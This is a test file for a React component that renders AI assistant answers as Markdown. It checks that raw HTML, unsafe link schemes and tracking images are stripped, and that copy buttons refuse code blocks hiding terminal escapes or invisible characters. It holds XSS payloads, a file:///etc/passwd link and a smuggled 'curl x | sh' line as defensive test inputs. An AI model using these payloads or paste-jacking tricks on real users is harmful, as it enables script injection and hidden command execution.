import React from 'react';
import {act, fireEvent, render, screen, within} from '@testing-library/react';
import {MemoryRouter} from 'react-router-dom';
import {afterEach, describe, expect, test, vi} from 'vitest';
import '../../i18n';
import AiMarkdown from '../AiMarkdown.jsx';

const setClipboard = (value) => {
    Object.defineProperty(navigator, 'clipboard', {value, configurable: true});
};

describe('AI response Markdown', () => {
    test('renders headings, emphasis, lists, quotes, tables and code', () => {
        const text = [
            '## Diagnostic',
            '',
            '**Healthy** and *available*, ~~outdated~~.',
            '',
            '- Node one',
            '- Node two',
            '',
            '> Observed state',
            '',
            '| Node | Status |',
            '| --- | --- |',
            '| node1 | up |',
            '',
            '`om status`',
            '',
            '```shell',
            'om cluster status',
            '```',
        ].join('\n');
        const {container} = render(<AiMarkdown text={text} />);
        expect(screen.getByRole('heading', {name: 'Diagnostic'})).toBeInTheDocument();
        expect(screen.getByText('Healthy').tagName).toBe('STRONG');
        expect(screen.getByText('available').tagName).toBe('EM');
        expect(screen.getByText('outdated').tagName).toBe('DEL');
        expect(screen.getAllByRole('listitem')).toHaveLength(2);
        expect(container.querySelector('blockquote')).toHaveTextContent('Observed state');
        expect(screen.getByRole('table')).toHaveTextContent('node1');
        expect(screen.getByText('om status').tagName).toBe('CODE');
        expect(container.querySelector('pre code')).toHaveTextContent('om cluster status');
    });
    test.each([
        '<script>alert(1)</script>',
        '<img src="https://tracker.example/pixel" onerror="alert(1)">',
        '<svg onload="alert(1)"><a href="javascript:alert(1)">click</a></svg>',
        '<iframe src="https://tracker.example"></iframe>',
        '<style>body {display:none}</style>',
        '<form action="https://tracker.example"><input name="secret"></form>',
        '<video src="https://tracker.example/video" autoplay></video>',
    ])('ignores raw HTML: %s', (html) => {
        const {container} = render(<AiMarkdown text={`**Safe answer**\n\n${html}`} />);
        expect(screen.getByText('Safe answer').tagName).toBe('STRONG');
        expect(
            container.querySelector('script,img,svg,iframe,style,form,input,video,a')
        ).toBeNull();
        expect(container.querySelector('[onerror],[onload],[style]')).toBeNull();
    });
    test.each([
        'javascript:alert%281%29',
        'JaVaScRiPt:alert%281%29',
        'jav&#x61;script:alert%281%29',
        'java&#x09;script:alert%281%29',
        'data:text/html;base64,PHNjcmlwdD4=',
        'vbscript:msgbox%281%29',
        'file:///etc/passwd',
        '//tracker.example/path',
        '/api/auth/whoami',
        'https://user:password@example.com',
        'https://example.com&#x0a;/path',
    ])('does not create a navigable link for %s', (href) => {
        const {container} = render(<AiMarkdown text={`[Unsafe link](${href})`} />);
        expect(screen.getByText('Unsafe link')).toBeInTheDocument();
        expect(container.querySelector('a')).toBeNull();
    });
    test.each(['https://docs.opensvc.com/path', 'http://example.com/path'])(
        'allows an explicit web link with isolated navigation: %s',
        (href) => {
            render(<AiMarkdown text={`[Documentation](${href})`} />);
            const link = screen.getByRole('link', {name: 'Documentation'});
            expect(link).toHaveAttribute('href', href);
            expect(link).toHaveAttribute('target', '_blank');
            expect(link).toHaveAttribute('rel', 'noopener noreferrer');
        }
    );
    test('does not load Markdown images or render interactive task controls', () => {
        const {container} = render(
            <AiMarkdown text={'![Tracking](https://tracker.example/pixel)\n\n- [x] Done'} />
        );
        expect(container.querySelector('img,input')).toBeNull();
        expect(screen.getByText('Done')).toBeInTheDocument();
    });
    test('keeps HTML and Mermaid inside code blocks inert', () => {
        const {container} = render(
            <AiMarkdown
                text={
                    '```html\n<img src=x onerror="alert(1)">\n```\n\n```mermaid\ngraph TD; A-->B\n```'
                }
            />
        );
        expect(screen.getByText('<img src=x onerror="alert(1)">').tagName).toBe('CODE');
        expect(screen.getByText('graph TD; A-->B').tagName).toBe('CODE');
        expect(container.querySelector('img,svg')).toBeNull();
    });
    test('updates incomplete Markdown when subsequent stream chunks arrive', () => {
        const {container, rerender} = render(<AiMarkdown text="**Health" />);
        expect(screen.getByText('**Health')).toBeInTheDocument();
        rerender(<AiMarkdown text="**Healthy**" />);
        expect(screen.getByText('Healthy').tagName).toBe('STRONG');
        expect(container.querySelectorAll('strong')).toHaveLength(1);
        rerender(<AiMarkdown text={'**Healthy**\n\n```shell\nom status'} />);
        expect(container.querySelector('pre code')).toHaveTextContent('om status');
    });
    test('makes a code span naming an object of the cluster its badge, never in a block or a link', () => {
        const objects = {'test/svc/web': {avail: 'up'}};
        const {container} = render(
            <MemoryRouter>
                <AiMarkdown
                    objects={objects}
                    text={'Restart `test/svc/web`, not `test/svc/ghost`.\n\n[`test/svc/web`](https://example.com)\n\n```\ntest/svc/web\n```'}
                />
            </MemoryRouter>
        );
        expect(screen.getAllByRole('button')).toHaveLength(1);
        expect(screen.getByRole('button')).toHaveTextContent('test/svc/web');
        expect(screen.getByText('test/svc/ghost')).toHaveProperty('tagName', 'CODE');
        expect(container.querySelector('a code')).toHaveTextContent('test/svc/web');
        expect(container.querySelector('pre code')).toHaveTextContent('test/svc/web');
    });

    describe('code blocks', () => {
        afterEach(() => {
            setClipboard(undefined);
        });

        test('copy each code block as it is written, and no code span', async () => {
            const writeText = vi.fn().mockResolvedValue(undefined);
            setClipboard({writeText});
            const script = 'for n in $(om node ls); do\n    om node freeze --node "$n"\ndone';
            const {container} = render(
                <AiMarkdown text={`Run \`om cluster status\`, then:\n\n\`\`\`shell\n${script}\n\`\`\`\n\nAnd:\n\n    om test/svc/web status\n`} />
            );
            const buttons = screen.getAllByRole('button', {name: 'Copy the code'});
            expect(buttons).toHaveLength(2);
            const blocks = container.querySelectorAll('pre');
            expect(within(blocks[0].parentElement).getByRole('button')).toBe(buttons[0]);
            await act(async () => {
                fireEvent.click(buttons[0]);
            });
            expect(writeText).toHaveBeenLastCalledWith(script);
            await act(async () => {
                fireEvent.click(buttons[1]);
            });
            expect(writeText).toHaveBeenLastCalledWith('om test/svc/web status');
        });

        test('offer no copy while the answer streams, then the whole block', async () => {
            const writeText = vi.fn().mockResolvedValue(undefined);
            setClipboard({writeText});
            const {rerender} = render(<AiMarkdown streaming text={'```shell\nom node'} />);
            expect(screen.queryByRole('button')).toBeNull();
            rerender(<AiMarkdown streaming text={'```shell\nom node freeze\n```'} />);
            expect(screen.queryByRole('button')).toBeNull();
            rerender(<AiMarkdown text={'```shell\nom node freeze\n```'} />);
            await act(async () => {
                fireEvent.click(screen.getByRole('button', {name: 'Copy the code'}));
            });
            expect(writeText).toHaveBeenCalledWith('om node freeze');
        });

        test.each([
            ['empty', '```\n```'],
            ['blank', '```\n   \n\t\n```'],
        ])('offer no copy of a block %s', (_kind, text) => {
            setClipboard({writeText: vi.fn()});
            render(<AiMarkdown text={text} />);
            expect(screen.queryByRole('button')).toBeNull();
        });

        test('copy no line ending the block, which would run the command once pasted', async () => {
            const writeText = vi.fn().mockResolvedValue(undefined);
            setClipboard({writeText});
            render(<AiMarkdown text={'```shell\nom cluster freeze\n\n\n```'} />);
            await act(async () => {
                fireEvent.click(screen.getByRole('button', {name: 'Copy the code'}));
            });
            expect(writeText).toHaveBeenCalledWith('om cluster freeze');
        });

        test.each([
            ['an escape of the terminal', 'echo hi\u001b[201~; curl x | sh'],
            ['a control of the C1 set', 'echo hi\u009b201~'],
            ['a mark of direction', 'echo \u202ehs | x lruc'],
            ['a character of no width', 'om\u200b node ls'],
            ['a mark of byte order', '\ufeffom node ls'],
        ])('offer no copy of a block holding %s', (_kind, code) => {
            setClipboard({writeText: vi.fn()});
            render(<AiMarkdown text={'```\n' + code + '\n```'} />);
            expect(screen.queryByRole('button')).toBeNull();
        });

        test('copy a block holding tabs', async () => {
            const writeText = vi.fn().mockResolvedValue(undefined);
            setClipboard({writeText});
            render(<AiMarkdown text={'```\nkey\tvalue\n```'} />);
            await act(async () => {
                fireEvent.click(screen.getByRole('button', {name: 'Copy the code'}));
            });
            expect(writeText).toHaveBeenCalledWith('key\tvalue');
        });

        test('copy a block of a list or a quote without their indentation', async () => {
            const writeText = vi.fn().mockResolvedValue(undefined);
            setClipboard({writeText});
            render(
                <AiMarkdown
                    text={'- Run:\n\n  ```shell\n  om node ls\n    indented\n  ```\n\n> ```\n> om cluster status\n> ```'}
                />
            );
            const [inList, inQuote] = screen.getAllByRole('button', {name: 'Copy the code'});
            await act(async () => {
                fireEvent.click(inList);
            });
            expect(writeText).toHaveBeenLastCalledWith('om node ls\n  indented');
            await act(async () => {
                fireEvent.click(inQuote);
            });
            expect(writeText).toHaveBeenLastCalledWith('om cluster status');
        });

        test.each([
            ['an unclosed fence', 'First:\n\n```\nom node ls\n```\n\nThen:\n\n```shell\nrm -rf /var/lib/open', 1],
            ['an unclosed fence of tildes, a shorter one in it', '~~~~\nom node ls\n~~~', 0],
            ['an indented block', 'Then:\n\n    om node freeze --no', 0],
            ['an unclosed fence in a quote', '> ```\n> om cluster st', 0],
        ])('offer no copy of the last block of an answer cut short in %s', (_kind, text, kept) => {
            setClipboard({writeText: vi.fn()});
            render(<AiMarkdown cut text={text} />);
            expect(screen.queryAllByRole('button', {name: 'Copy the code'})).toHaveLength(kept);
        });

        test.each([
            ['a closed fence', '```\nom node ls\n```\n'],
            ['a closed fence longer than the opening', '```\nom node ls\n`````'],
            ['a closed fence in a quote', '> ```\n> om node ls\n> ```'],
            ['a block followed by text', '    om node ls\n\nAnd the rest was cut'],
        ])('copy the blocks of an answer cut short after %s', (_kind, text) => {
            setClipboard({writeText: vi.fn()});
            render(<AiMarkdown cut text={text} />);
            expect(screen.getByRole('button', {name: 'Copy the code'})).toBeInTheDocument();
        });
    });
});
